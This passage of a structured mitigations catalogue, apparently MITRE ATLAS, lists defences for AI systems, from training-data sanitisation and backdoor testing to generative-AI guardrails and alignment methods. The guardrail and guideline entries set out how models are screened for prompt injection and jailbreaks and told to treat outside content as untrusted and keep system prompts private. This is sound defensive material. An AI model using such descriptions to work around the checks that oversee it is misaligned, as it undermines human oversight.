    created-date: '2023-04-12'
    modified-date: '2026-07-31'
    lifecycle-phases:
    - Business and Data Understanding
    - Data Preparation
    - AI Model Engineering
    - AI Model Evaluation
    categories:
    - Policy
    id: AML.M0005
    uuid: 1fc2879c-d3c3-5dbf-882d-4ca4721f30d4
    object-type: mitigation
  AML.M0006:
    name: Predictive AI Ensembles
    description: 'Use an ensemble of diverse predictive AI models to reduce reliance
      on a single model or model family and improve robustness against adversarial
      examples.


      Ensemble members should be sufficiently diverse, such as through different architectures,
      training procedures, features, or model families. Combine their predictions
      using an aggregation or adjudication method designed to prevent an adversarial
      example that evades one model from controlling the system''s predictions.'
    references: []
    created-date: '2023-04-12'
    modified-date: '2026-07-31'
    lifecycle-phases:
    - AI Model Engineering
    categories:
    - Technical - AI
    id: AML.M0006
    uuid: 0f15844f-7146-5bcd-8787-4e6f688f9a2c
    object-type: mitigation
  AML.M0007:
    name: Sanitize Training Data
    description: 'Detect and remove or remediate poisoned training data.  Training
      data should be sanitized prior to model training and recurrently for an active
      learning model.


      Implement a filter to limit ingested training data.  Establish a content policy
      that would remove unwanted content such as certain explicit or offensive language
      from being used.'
    references: []
    created-date: '2023-04-12'
    modified-date: '2025-12-23'
    lifecycle-phases:
    - Business and Data Understanding
    - Data Preparation
    - Monitoring and Maintenance
    categories:
    - Technical - AI
    id: AML.M0007
    uuid: aba79819-27d3-5204-9fed-011613fa8136
    object-type: mitigation
  AML.M0008:
    name: Validate AI Model
    description: 'Validate that AI models perform as intended by testing for backdoor
      triggers, potential for data leakage, or adversarial influence.

      Monitor AI model for concept drift and training data drift, which may indicate
      data tampering and poisoning.'
    references: []
    created-date: '2023-04-12'
    modified-date: '2025-12-23'
    lifecycle-phases:
    - AI Model Evaluation
    - Monitoring and Maintenance
    categories:
    - Technical - AI
    id: AML.M0008
    uuid: b1132427-33bb-5055-9e86-9df87ad144e7
    object-type: mitigation
  AML.M0009:
    name: Predictive AI Multi-Sensor Fusion
    description: 'Use independent physical sensors (ideally across multiple modalities
      or from several perspectives) to avoid relying on a single sensor that may be
      manipulated, obstructed, or disrupted by an adversary.


      Relevant sensors may include visible-light cameras, infrared cameras, depth
      sensors, radar, lidar, microphones, or other physical sensing systems. Corroborate
      observations across sensors so manipulation of one input source does not overly
      influence the model''s predictions.'
    references: []
    created-date: '2023-04-12'
    modified-date: '2026-07-31'
    lifecycle-phases:
    - Business and Data Understanding
    - Data Preparation
    - AI Model Engineering
    categories:
    - Technical - Cyber
    id: AML.M0009
    uuid: 6c1c5f7a-986c-5c1f-ac9b-bde692d0b3fe
    object-type: mitigation
  AML.M0010:
    name: Predictive AI Input Restoration
    description: 'Preprocess predictive AI inference inputs to remove, reduce, or
      disrupt adversarial perturbations before the inputs are evaluated by the model.


      Restoration methods may include denoising, compression, reconstruction, resampling,
      feature squeezing, randomized transformations, or other modality-appropriate
      preprocessing. Evaluate restoration methods against adaptive adversaries that
      account for the preprocessing operation.'
    references: []
    created-date: '2023-04-12'
    modified-date: '2026-07-31'
    lifecycle-phases:
    - Data Preparation
    - AI Model Evaluation
    - Deployment
    - Monitoring and Maintenance
    categories:
    - Technical - AI
    id: AML.M0010
    uuid: 1c8b96b0-c21f-5a9b-b478-ddd9ac40f686
    object-type: mitigation
  AML.M0011:
    name: Restrict Library Loading
    description: 'Prevent abuse of library loading mechanisms in the operating system
      and software to load untrusted code by configuring appropriate library loading
      mechanisms and investigating potential vulnerable software.


      File formats such as pickle files that are commonly used to store AI models
      can contain exploits that allow for loading of malicious libraries.'
    references: []
    created-date: '2023-04-12'
    modified-date: '2026-07-31'
    attack-reference:
      id: M1044
      url: https://attack.mitre.org/mitigations/M1044/
    lifecycle-phases:
    - Deployment
    categories:
    - Technical - Cyber
    id: AML.M0011
    uuid: 94cf1dc2-512c-5d81-b073-891d7113c194
    object-type: mitigation
  AML.M0012:
    name: Encrypt Sensitive Information
    description: Encrypt sensitive data such as AI models to protect against adversaries
      attempting to access sensitive data.
    references: []
    created-date: '2023-04-12'
    modified-date: '2025-12-23'
    attack-reference:
      id: M1041
      url: https://attack.mitre.org/mitigations/M1041/
    lifecycle-phases:
    - Data Preparation
    - AI Model Engineering
    - Deployment
    categories:
    - Technical - Cyber
    id: AML.M0012
    uuid: 33f3432f-83e7-5d59-924c-ed2b817c2214
    object-type: mitigation
  AML.M0013:
    name: Code Signing
    description: Enforce binary and application integrity with digital signature verification
      to prevent untrusted code from executing. Adversaries can embed malicious code
      in AI software or models. Developers should also cryptographically sign SBOM
      and AIBOM components that track model or data provenance. Enforcement of code
      signing can prevent the compromise of the AI supply chain and prevent execution
      of malicious code.
    references: []
    created-date: '2023-04-12'
    modified-date: '2026-03-19'
    attack-reference:
      id: M1045
      url: https://attack.mitre.org/mitigations/M1045/
    lifecycle-phases:
    - Deployment
    categories:
    - Technical - Cyber
    id: AML.M0013
    uuid: 0fd2a106-347e-51b2-8c78-2fdd4b091548
    object-type: mitigation
  AML.M0014:
    name: Verify AI Artifacts
    description: Verify the cryptographic checksum of all AI artifacts to verify that
      the file was not modified by an attacker.
    references: []
    created-date: '2023-04-12'
    modified-date: '2025-12-23'
    lifecycle-phases:
    - Business and Data Understanding
    - Data Preparation
    - AI Model Engineering
    categories:
    - Technical - Cyber
    id: AML.M0014
    uuid: bf670d38-5978-5e5e-ba61-9b61dbc70122
    object-type: mitigation
  AML.M0015:
    name: Predictive AI Adversarial Input Detection
    description: 'Detect and block digital or physical adversarial examples submitted
      to predictive AI models. Adversarial examples are inputs modified or constructed
      to cause misclassification, missed detection, excessive computation, or another
      attacker-selected behavior.


      Apply detection before model inference and monitor for input characteristics
      or query patterns associated with adversarial example generation, transfer attacks,
      or black-box optimization. Detection may use statistical tests, auxiliary models,
      consistency checks, input distribution analysis, or modality-specific adversarial
      example detectors.'
    references: []
    created-date: '2023-04-12'
    modified-date: '2026-07-31'
    lifecycle-phases:
    - Data Preparation
    - AI Model Engineering
    - AI Model Evaluation
    - Deployment
    - Monitoring and Maintenance
    categories:
    - Technical - AI
    id: AML.M0015
    uuid: 20c3de3a-045a-5c5d-883b-4bb074cc427e
    object-type: mitigation
  AML.M0016:
    name: Vulnerability Scanning
    description: 'Vulnerability scanning is used to find potentially exploitable software
      vulnerabilities to remediate them.


      File formats such as pickle files that are commonly used to store AI models
      can contain exploits that allow for arbitrary code execution.

      These files should be scanned for potentially unsafe calls, which could be used
      to execute code, create new processes, or establish networking capabilities.

      Adversaries may embed malicious code in corrupt model files, so scanners should
      be capable of working with models that cannot be fully de-serialized.

      Model artifacts, downstream products produced by models, and external software
      dependencies should be scanned for known vulnerabilities.'
    references: []
    created-date: '2023-04-12'
    modified-date: '2026-08-31'
    lifecycle-phases:
    - Data Preparation
    - AI Model Engineering
    categories:
    - Technical - Cyber
    id: AML.M0016
    uuid: c578b076-802d-50d7-9d88-25d62ea569c8
    object-type: mitigation
  AML.M0017:
    name: AI Model Distribution Methods
    description: 'Deploying AI models to edge devices can increase the attack surface
      of the system.

      Consider serving models in the cloud to reduce the level of access the adversary
      has to the model.

      Also consider computing features in the cloud to prevent gray-box attacks, where
      an adversary has access to the model preprocessing methods.'
    references: []
    created-date: '2023-04-12'
    modified-date: '2025-12-23'
    lifecycle-phases:
    - Deployment
    categories:
    - Policy
    id: AML.M0017
    uuid: 3c7d2fc8-7b70-54d5-b722-2a5c9292f88a
    object-type: mitigation
  AML.M0018:
    name: User Training
    description: 'Educate AI model developers to on AI supply chain risks and potentially
      malicious AI artifacts.

      Educate users on how to identify deepfakes and phishing attempts.'
    references: []
    created-date: '2023-04-12'
    modified-date: '2026-04-22'
    attack-reference:
      id: M1017
      url: https://attack.mitre.org/mitigations/M1017/
    lifecycle-phases:
    - Business and Data Understanding
    - Data Preparation
    - AI Model Engineering
    - AI Model Evaluation
    - Deployment
    - Monitoring and Maintenance
    categories:
    - Policy
    id: AML.M0018
    uuid: 291b6312-52da-583e-bebe-bbc4cb40db4a
    object-type: mitigation
  AML.M0019:
    name: Control Access to AI Models and Data in Production
    description: 'Require users to verify their identities before accessing a production
      model.

      Require authentication for API endpoints and monitor production model queries
      to ensure compliance with usage policies and to prevent model misuse.'
    references: []
    created-date: '2024-01-12'
    modified-date: '2026-07-31'
    lifecycle-phases:
    - Deployment
    - Monitoring and Maintenance
    categories:
    - Policy
    id: AML.M0019
    uuid: 9ae01d8c-c75b-5d11-944f-16edbb7d754f
    object-type: mitigation
  AML.M0020:
    name: Generative AI Guardrails
    description: 'Guardrails are safety controls placed between users, tools, and
      generative AI models to evaluate prompts, retrieved context, model outputs,
      and agent actions before they are accepted, executed, or shown to a user. They
      can help block, modify, or route unwanted content such as malicious code, malicious
      instructions, sensitive data, unsupported claims, policy-violating responses,
      or unsafe tool requests.


      Guardrails can be implemented using rule-based controls such as filters, allowlists,
      blocklists, regular expressions, schema validation, policy rules, and permission
      checks, or using AI-based techniques such as classifiers, LLM reviewers/judges,
      named entity recognition, groundedness checks, and task-adherence checks. They
      may be applied at multiple stages of a generative AI workflow, including input
      handling, prompt construction, retrieval, tool execution, model output review,
      and post-deployment monitoring.


      Examples of specific guardrail implementations include:[[owasp-llm-top10]]  [[datadog-llm-guardrails]]
      [[azure-ai-content-safety]] [[nvidia-nemo-guardrails]]

      - Input moderation: Screen user prompts for harmful content, prompt injection
      attempts, jailbreak attempts, sensitive data, off-topic requests, or inputs
      that exceed expected length or format.

      - Output moderation: Scan model responses before sending them to users for harmful
      content, PII, secrets, policy violations, unsupported claims, or unsafe code
      using classical scanners, classifiers, or a dedicated reviewer model .

      - System prompt and policy enforcement: Enforce system instructions, user roles,
      domain boundaries, response formats, and refusal policies before the model responds
      (See [Generative AI Guidelines](/mitigations/AML.M0021)).

      - Tool and action guardrails: Validate tool calls, tool arguments, permissions,
      and tool outputs before execution or before results are returned to the model.
      Require human approval for high-impact, irreversible, privileged, or externally
      visible actions (See [Human In-the-Loop for AI Agent Actions](/mitigations/AML.M0029),
      [Input and Output Validation for AI Agent Components](/mitigations/AML.M0033)).

      - Retrieval guardrails: Filter and validate retrieved documents before they
      are added to model context, including checks for untrusted sources, malicious
      instructions, irrelevant context, or sensitive data.

      - Groundedness and factuality checks: Compare model responses against trusted
      source material or approved knowledge bases to detect unsupported or hallucinated
      claims.

      - Sensitive data and secret protection: Detect, redact, or block personal information,
      credentials, tokens, proprietary data, system prompts, and other confidential
      information in prompts, retrieved context, tool outputs, and model responses.

      - Structured output validation: Enforce schemas, type checks, allowed values,
      and safe formats before model outputs are consumed by downstream systems


      Guardrails should be continuously evaluated, red-teamed, and updated as adversarial
      techniques evolve. Guardrail decisions should be logged (See [AI Telemetry Logging](/mitigations/AML.M0021))
      and observed failures should be systematically incorporated into updated policies,
      evaluation datasets, detection logic, prompts, and [Generative AI Model Alignment](/mitigations/AML.M0022).'
    references:
    - id: owasp-llm-top10
      title: OWASP Top 10 for Large Language Model Applications
      url: https://owasp.org/www-project-top-10-for-large-language-model-applications
    - id: datadog-llm-guardrails
      title: 'LLM guardrails: Best practices for deploying LLM apps securely'
      url: https://www.datadoghq.com/blog/llm-guardrails-best-practices
    - id: nvidia-nemo-guardrails
      title: NVIDIA NeMo Guardrails Library Developer Guide - Guardrail Types
      url: https://docs.nvidia.com/nemo/guardrails/about-nemo-guardrails-library/rail-types
    - id: azure-ai-content-safety
      title: What is Azure AI Content Safety?
      url: https://learn.microsoft.com/en-us/azure/ai-services/content-safety/overview
    created-date: '2025-03-12'
    modified-date: '2026-07-31'
    lifecycle-phases:
    - AI Model Engineering
    - AI Model Evaluation
    - Deployment
    - Monitoring and Maintenance
    categories:
    - Technical - AI
    id: AML.M0020
    uuid: eae4dfbe-1a12-5a2e-bad8-d5adbbf39cb6
    object-type: mitigation
  AML.M0021:
    name: Generative AI Guidelines
    description: 'Guidelines are instructions, policies, and behavioral constraints
      provided to a generative AI model to direct it toward desired outputs and away
      from unsafe, unreliable, or policy-violating behavior. Guidelines can help reduce
      risks related to organization policy violations, brand damage, private data
      leakage, false or unsupported information, unsafe advice, and misuse of tools
      or external content.


      Guidelines can be implemented as system prompts, prompt templates, policy text
      appended to user prompts, or task-specific instructions included during prompt
      construction. They can define the system''s goals, role, tone, allowed and disallowed
      behavior, domain boundaries, citation requirements, data-handling expectations,
      escalation criteria, and safety or security rules.


      Common prompt elements include:

      - Instructions to cite sources or identify when an answer is not supported by
      available context.

      - Instructions to treat external, retrieved, or user-provided content as untrusted
      data rather than authoritative sources.

      - Instructions to avoid revealing system prompts, hidden policies, credentials,
      private data, or other sensitive information.

      - Instructions to stay within the application''s approved domain and refuse
      requests outside that scope.

      - Instructions to follow organization-specific policies, brand requirements,
      and regulated-domain restrictions.

      - Instructions to request human approval before proceeding with potentially
      unsafe, privileged, irreversible, or externally visible actions when untrusted
      content is in context (See [Human In-the-Loop for AI Agent Actions](/mitigations/AML.M0029)).


      Guidelines should be tested, red-teamed, and updated as observed failures, prompt
      injection techniques, policy requirements, and application capabilities evolve.
      Guidelines are most effective when paired with [Generative AI Guardrails](/mitigations/AML.M0020)
      that validate inputs, outputs, retrieved context, and tool use.'
    references: []
    created-date: '2025-03-12'
    modified-date: '2026-07-31'
    lifecycle-phases:
    - AI Model Engineering
    - AI Model Evaluation
    - Deployment
    categories:
    - Technical - AI
    id: AML.M0021
    uuid: 4f43e1d3-1198-56e6-91ac-654ee9972acd
    object-type: mitigation
  AML.M0022:
    name: Generative AI Model Alignment
    description: 'Generative AI Model Alignment is the process of training or fine-tuning
      a generative model to guide its output toward a set of human values, goals,
      or ethical principles. Desired principles can be in alignment with safety, security,
      content policies, and legal requirements, with goals such as removing harmful
      content or hallucinations, reducing biases, increasing predictability, and ensuring
      models do not have adverse societal consequences. In the context of agentic
      AI, alignment is about producing models that make decisions in support of the
      goals of the organization and individual users, with actions that remain in
      scope of the designated task, and designing agents that follow security standards,
      exhibit transparency in decision making, and operate within organizational boundaries.


      Common methods for aligning a generative model during training or fine-tuning
      include[[ibm-llm-alignment]][[meta-llama]]:

      - Reinforcement Learning from Human or AI Feedback (RLHF or RLAIF)

      - Supervised Fine-Tuning (SFT)

      - Targeted Safety Context Distillation

      - Instruction Tuning

      - Direct Preference Optimization (DPO)

      - Constitutional AI

      - Incoulation Prompting


      For agentic systems, alignment depends on the purpose of the agent, the tools
      available to the agent, and the levels of privileges and risks associated with
      tool calls. Standard alignment methods for LLMs can often be used in conjunction
      with domain-specific fine-tuning data, reward signals with examples of correct
      tool calls, or reinforcement learning based on interactions with a realistic
      environment. Examples of alignment methods specific to agentic AI are:

      - Trajectory Preference Optimization[[tpmm-dpo]]

      - Environment-Driven Reinforcement Learning[[envrl]]

      - Reinforcement Learning with Execution Feedback (RLEF)[[rlef]]

      - Reinforcement Learning with Verifiable Rewards (RLVR)[[nvidia-mastering-agentic]]


      Generative AI Model Alignment should be used in combination with [Generative
      AI Guardrails](mitigations/AML.M0020) and [Generative AI Guidelines](mitigations/AML.M0021).
      Models should be continually evaluated for alignment and retrained or fine-tuned
      systematically to incorporate observed failure modes or updated policies. It
      is important to also consider that fine-tuning a model can remove previously
      learned alignments and should be undertaken with care and a comprehensive plan
      for testing the updated model for safety and security.'
    references:
    - id: ibm-llm-alignment
      title: What is LLM alignment?
      url: https://www.ibm.com/think/topics/llm-alignment
    - id: meta-llama
      title: 'Meta Llama: Responsible Use Guide'
      url: https://ai.meta.com/static-resource/responsible-use-guide/
    - id: tpmm-dpo
      title: 'TPMM-DPO: Trajectory-aware Preference-guided Model Merging for Iterative
